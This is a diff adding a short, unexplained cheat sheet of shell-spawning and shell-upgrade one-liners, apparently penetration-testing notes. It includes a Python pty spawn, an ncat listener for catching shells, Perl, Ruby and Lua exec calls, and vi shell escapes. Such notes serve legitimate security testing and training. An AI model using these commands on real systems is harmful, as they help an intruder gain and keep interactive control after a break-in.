@@ -1,0 +1,12 @@
+•	python -c 'import pty; pty.spawn("/bin/bash")'
+•	rlwrap ncat -lvp port
+•	/usr/bin/script -qc /bin/bash /dev/null
+•	/bin/sh -i
+•	echo os.system('/bin/bash')
+•	perl -e 'exec "/bin/sh";'
+•	perl: exec "/bin/sh";
+•	ruby: exec "/bin/sh";
+•	lua: os.execute('/bin/bash')
+•	# Using Vi
+    o	:!bash
+    o	:set shell=/bin/bash:shell
